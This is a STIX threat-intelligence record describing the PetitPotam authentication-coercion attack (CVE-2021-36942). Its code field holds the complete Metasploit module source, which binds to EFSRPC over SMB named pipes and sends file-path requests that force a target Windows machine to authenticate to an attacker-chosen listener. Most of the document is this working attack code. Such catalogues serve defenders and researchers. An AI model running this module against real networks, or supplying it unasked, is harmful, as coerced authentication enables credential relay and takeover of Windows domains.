{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7ebe42d1-6264-4328-89c5-9a921f80cb92",
    "created": "2024-08-14T16:26:52.948914Z",
    "modified": "2024-08-14T16:26:52.948918Z",
    "name": "PetitPotam",
    "description": " Coerce an authentication attempt over SMB to other machines via MS-EFSRPC methods. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/dcerpc/petitpotam.rb",
            "external_id": "petitpotam.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-36942"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/topotam/PetitPotam"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/403c7ae0-1a3a-4e96-8efc-54e79a2cc451"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'windows_error'\nrequire 'ruby_smb'\nrequire 'ruby_smb/error'\nrequire 'ruby_smb/dcerpc/encrypting_file_system'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n  include Msf::Auxiliary::Scanner\n\n  EncryptingFileSystem = RubySMB::Dcerpc::EncryptingFileSystem\n\n  METHODS = %w[EfsRpcOpenFileRaw EfsRpcEncryptFileSrv EfsRpcDecryptFileSrv EfsRpcQueryUsersOnFile EfsRpcQueryRecoveryAgents].freeze\n  PIPE_HANDLES = {\n    lsarpc: {\n      uuid: EncryptingFileSystem::LSARPC_UUID,\n      opts: ['\\\\lsarpc'.freeze]\n    },\n    efsrpc: {\n      uuid: EncryptingFileSystem::EFSRPC_UUID,\n      opts: ['\\\\efsrpc'.freeze]\n    },\n    samr: {\n      uuid: EncryptingFileSystem::LSARPC_UUID,\n      opts: ['\\\\samr'.freeze]\n    },\n    lsass: {\n      uuid: EncryptingFileSystem::LSARPC_UUID,\n      opts: ['\\\\lsass'.freeze]\n    },\n    netlogon: {\n      uuid: EncryptingFileSystem::LSARPC_UUID,\n      opts: ['\\\\netlogon'.freeze]\n    }\n  }.freeze\n\n  def initialize\n    super(\n      'Name' => 'PetitPotam',\n      'Description' => %q{\n        Coerce an authentication attempt over SMB to other machines via MS-EFSRPC methods.\n      },\n      'Author' => [\n        'GILLES Lionel',\n        'Spencer McIntyre'\n      ],\n      'References' => [\n        [ 'CVE', '2021-36942' ],\n        [ 'URL', 'https://github.com/topotam/PetitPotam' ],\n        [ 'URL', 'https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/403c7ae0-1a3a-4e96-8efc-54e79a2cc451' ]\n      ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptString.new('LISTENER', [ true, 'The host listening for the incoming connection', Rex::Socket.source_address ]),\n        OptEnum.new('PIPE', [ true, 'The named pipe to use for triggering', 'lsarpc', PIPE_HANDLES.keys.map(&:to_s) ]),\n        OptEnum.new('METHOD', [ true, 'The RPC method to use for triggering', 'Automatic', ['Automatic'] + METHODS ])\n      ]\n    )\n  end\n\n  def run_host(_ip)\n    begin\n      connect\n    rescue Rex::ConnectionError => e\n      fail_with(Failure::Unreachable, e.message)\n    end\n\n    begin\n      smb_login\n    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e\n      fail_with(Failure::NoAccess, \"Unable to authenticate ([#{e.class}] #{e}).\")\n    end\n\n    handle_args = PIPE_HANDLES[datastore['PIPE'].to_sym]\n    fail_with(Failure::BadConfig, \"Invalid pipe: #{datastore['PIPE']}\") unless handle_args\n\n    @handle = dcerpc_handle(\n      handle_args[:uuid],\n      handle_args.fetch(:version, '1.0'),\n      handle_args.fetch(:protocol, 'ncacn_np'),\n      handle_args[:opts]\n    )\n    vprint_status(\"Binding to #{@handle} ...\")\n    dcerpc_bind(@handle)\n    vprint_status(\"Bound to #{@handle} ...\")\n\n    if datastore['METHOD'] == 'Automatic'\n      methods = METHODS\n    else\n      methods = [datastore['METHOD']]\n    end\n\n    methods.each do |method|\n      vprint_status(\"Attempting to coerce authentication via #{method}\")\n      response = efs_call(\n        method,\n        file_name: \"\\\\\\\\#{datastore['LISTENER']}\\\\#{Rex::Text.rand_text_alphanumeric(4..8)}\\\\#{Rex::Text.rand_text_alphanumeric(4..8)}.#{Rex::Text.rand_text_alphanumeric(3)}\"\n      )\n      if response.nil?\n        unless method == methods.last\n          # rebind if we got a DCERPC error (as indicated by no response) and there are more methods to try\n          vprint_status(\"Rebinding to #{@handle} ...\")\n          dcerpc_bind(@handle)\n        end\n\n        next\n      end\n\n      error_status = response.error_status.to_i\n      win32_error = ::WindowsError::Win32.find_by_retval(error_status).first\n      case win32_error\n      when ::WindowsError::Win32::ERROR_BAD_NETPATH\n        # this should be the response even if LISTENER was inaccessible\n        print_good('Server responded with ERROR_BAD_NETPATH which indicates that the attack was successful')\n        break\n      when nil\n        print_status(\"Server responded with unknown error: 0x#{error_status.to_s(16).rjust(8, '0')}\")\n      else\n        print_status(\"Server responded with #{win32_error.name} (#{win32_error.description})\")\n      end\n    end\n  end\n\n  def efs_call(name, **kwargs)\n    request = EncryptingFileSystem.const_get(\"#{name}Request\").new(**kwargs)\n\n    begin\n      raw_response = dcerpc.call(request.opnum, request.to_binary_s)\n    rescue Rex::Proto::DCERPC::Exceptions::Fault => e\n      print_error \"The #{name} Encrypting File System RPC request failed (#{e.message}).\"\n      return nil\n    end\n\n    EncryptingFileSystem.const_get(\"#{name}Response\").read(raw_response)\n  end\nend\n"
}